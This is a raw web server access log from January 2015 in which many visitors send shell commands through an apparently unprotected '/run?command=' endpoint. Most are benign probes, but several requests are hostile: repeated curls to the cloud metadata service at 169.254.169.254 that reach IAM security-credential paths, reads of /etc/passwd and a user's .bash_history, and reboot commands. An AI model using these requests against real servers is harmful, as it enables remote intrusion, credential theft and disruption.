83.94.196.118 - - [19/Jan/2015:13:34:58 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
83.94.196.118 - - [19/Jan/2015:13:34:58 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
150.70.173.55 - - [19/Jan/2015:13:35:17 +0000] "GET /run?command=cat%20/home/python/.bash_history HTTP/1.1" 200 162 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
213.74.127.134 - - [19/Jan/2015:13:35:19 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:35:23 +0000] "GET /run?command=cd%20usr%0Als HTTP/1.1" 200 71 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:35:45 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/security-groups HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:35:47 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/security-groups/ HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:36:05 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/hostname HTTP/1.1" 200 73 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
190.0.62.238 - - [19/Jan/2015:13:36:09 +0000] "GET /run?command=cd%20usr%0Als%0Amkdir%20jota%0Als HTTP/1.1" 200 77 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:36:23 +0000] "GET /run?command=touch%20/home/python/home_sweet_home HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
115.64.152.24 - - [19/Jan/2015:13:36:34 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:36:35 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:36:38 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 599 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
67.170.22.124 - - [19/Jan/2015:13:36:39 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
67.170.22.124 - - [19/Jan/2015:13:36:40 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:36:42 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:36:48 +0000] "GET /run?command=mkdir%20monkeys HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:36:49 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:36:50 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:36:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:36:53 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
67.170.22.124 - - [19/Jan/2015:13:37:04 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:37:07 +0000] "GET /run?command=mkdir%20monkeys&ls HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:37:09 +0000] "GET /run?command=cd%20%20/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:37:09 +0000] "GET /run?command=curl%20http://169.254.169.254//latest/dynamic/instance-identity/document HTTP/1.1" 200 280 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
115.64.152.24 - - [19/Jan/2015:13:37:15 +0000] "GET /run?command=mkdir%20monkeys&amp;ls HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
150.70.97.124 - - [19/Jan/2015:13:37:16 +0000] "GET /run?command=touch%20/home/python/home_sweet_home HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
67.170.22.124 - - [19/Jan/2015:13:37:19 +0000] "GET /run?command=sudo%20reboot HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:37:20 +0000] "GET /run?command=echo%20%22can%20anyone%20hear%20me?%22%20%3E%3E%20/home/python/home_sweet_home HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
67.170.22.124 - - [19/Jan/2015:13:37:27 +0000] "GET /run?command=reboot HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:37:32 +0000] "GET /run?command=cd%20%20%20&%20ll HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:37:32 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
67.170.22.124 - - [19/Jan/2015:13:37:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
179.26.191.239 - - [19/Jan/2015:13:37:36 +0000] "GET /run?command=cd%20%20%20&%20ls HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"
67.170.22.124 - - [19/Jan/2015:13:37:43 +0000] "GET /run?command=ls%20/opt HTTP/1.1" 200 16 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
83.94.196.118 - - [19/Jan/2015:13:38:09 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
83.94.196.118 - - [19/Jan/2015:13:38:10 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 550 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
150.70.173.8 - - [19/Jan/2015:13:38:10 +0000] "GET /run?command=echo%20%22can%20anyone%20hear%20me?%22%20%3E%3E%20/home/python/home_sweet_home HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
150.70.173.9 - - [19/Jan/2015:13:38:15 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 40 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
78.172.44.50 - - [19/Jan/2015:13:38:24 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
82.22.136.59 - - [19/Jan/2015:13:38:51 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://l.facebook.com/lsr.php?u=http%3A%2F%2F54.154.158.219%2Frun%3Fcommand%3Dls&ext=1421674790&hash=AclaLPbY-opRabjjo8EE1ODx5Pv5ol5OX1pJBG9yHtZnpw" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.22.136.59 - - [19/Jan/2015:13:38:51 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
69.171.237.119 - - [19/Jan/2015:13:38:51 +0000] "GET /run HTTP/1.1" 500 291 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
213.74.127.134 - - [19/Jan/2015:13:38:52 +0000] "GET /run?command=curl%20http://169.254.169.254//latest/dynamic/instance-identity/document HTTP/1.1" 200 280 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:38:55 +0000] "GET /run?command=curl%20http://169.254.169.254//latest/dynamic/ HTTP/1.1" 200 19 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:00 +0000] "GET /run?command=curl%20http://169.254.169.254//latest/meta-data HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:04 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:06 +0000] "GET /run?command=curl%20http://169.254.169.254/latest HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:15 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:21 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ieam HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:23 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/iam HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:39:29 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/iam/aws-config-role HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
109.175.147.120 - - [19/Jan/2015:13:39:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
109.175.147.120 - - [19/Jan/2015:13:39:33 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:40:22 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:41:09 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
109.175.147.120 - - [19/Jan/2015:13:41:14 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
80.187.106.156 - - [19/Jan/2015:13:41:14 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
109.175.147.120 - - [19/Jan/2015:13:41:17 +0000] "GET /run?command=uptime HTTP/1.1" 200 85 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
109.175.147.120 - - [19/Jan/2015:13:41:21 +0000] "GET /run?command=ls%20-l HTTP/1.1" 200 388 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
196.209.216.85 - - [19/Jan/2015:13:41:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36"
196.209.216.85 - - [19/Jan/2015:13:41:24 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36"
196.209.216.85 - - [19/Jan/2015:13:41:24 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 557 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36"
109.175.147.120 - - [19/Jan/2015:13:41:33 +0000] "GET /run?command=uname%20-a HTTP/1.1" 200 126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
84.30.95.219 - - [19/Jan/2015:13:41:39 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
84.30.95.219 - - [19/Jan/2015:13:41:39 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
84.30.95.219 - - [19/Jan/2015:13:41:39 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
84.30.95.219 - - [19/Jan/2015:13:41:40 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 548 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
78.172.44.50 - - [19/Jan/2015:13:41:44 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
109.175.147.120 - - [19/Jan/2015:13:41:56 +0000] "GET /run?command=cat%20/etc/passwd HTTP/1.1" 200 540 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:42:00 +0000] "GET /run?command=cat%20/home/python/home_sweet_home HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
84.30.95.219 - - [19/Jan/2015:13:42:12 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
84.30.95.219 - - [19/Jan/2015:13:42:17 +0000] "GET /run?command=ls%20/etc/ HTTP/1.1" 200 869 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
74.211.3.12 - - [19/Jan/2015:13:42:23 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.2; VS985 4G Build/KVT49L.VS98512B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
74.211.3.12 - - [19/Jan/2015:13:42:23 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.2; VS985 4G Build/KVT49L.VS98512B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
189.111.171.114 - - [19/Jan/2015:13:42:25 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
150.70.75.167 - - [19/Jan/2015:13:42:37 +0000] "GET / HTTP/1.1" 404 233 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
217.92.97.128 - - [19/Jan/2015:13:42:45 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 671 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
217.92.97.128 - - [19/Jan/2015:13:42:46 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
217.92.97.128 - - [19/Jan/2015:13:42:59 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.22.136.59 - - [19/Jan/2015:13:43:22 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://l.facebook.com/lsr.php?u=http%3A%2F%2F54.154.158.219%2Frun%3Fcommand%3Dls&ext=1421675061&hash=AckwMxHGUABWSbeC83L1hUR8suVKeT2l3vgRBrgfLmciRw" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
74.211.3.12 - - [19/Jan/2015:13:43:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.2; VS985 4G Build/KVT49L.VS98512B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.87 Mobile Safari/537.36"
74.211.3.12 - - [19/Jan/2015:13:43:28 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.2; VS985 4G Build/KVT49L.VS98512B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.87 Mobile Safari/537.36"
212.219.92.51 - - [19/Jan/2015:13:44:01 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
212.219.92.51 - - [19/Jan/2015:13:44:01 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
212.219.92.51 - - [19/Jan/2015:13:44:05 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
212.219.92.51 - - [19/Jan/2015:13:44:08 +0000] "GET /run?command=cd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.171.191.147 - - [19/Jan/2015:13:44:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
70.171.191.147 - - [19/Jan/2015:13:44:24 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
70.171.191.147 - - [19/Jan/2015:13:44:25 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:44:46 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/iam/security-credentials/myrole HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
94.215.145.91 - - [19/Jan/2015:13:45:04 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
94.215.145.91 - - [19/Jan/2015:13:45:04 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
94.215.145.91 - - [19/Jan/2015:13:45:04 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
94.215.145.91 - - [19/Jan/2015:13:45:09 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
84.30.191.103 - - [19/Jan/2015:13:45:13 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 494 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
84.30.191.103 - - [19/Jan/2015:13:45:13 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
209.195.113.163 - - [19/Jan/2015:13:46:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
209.195.113.163 - - [19/Jan/2015:13:46:27 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
209.195.113.163 - - [19/Jan/2015:13:46:27 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
78.172.44.50 - - [19/Jan/2015:13:46:42 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:43 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:43 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:44 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:44 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:45 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:46:46 +0000] "GET /run?command=awk%20%27{print%20$1}%27%20python.access.log%20|sort%20-u%20|wc%20-l HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
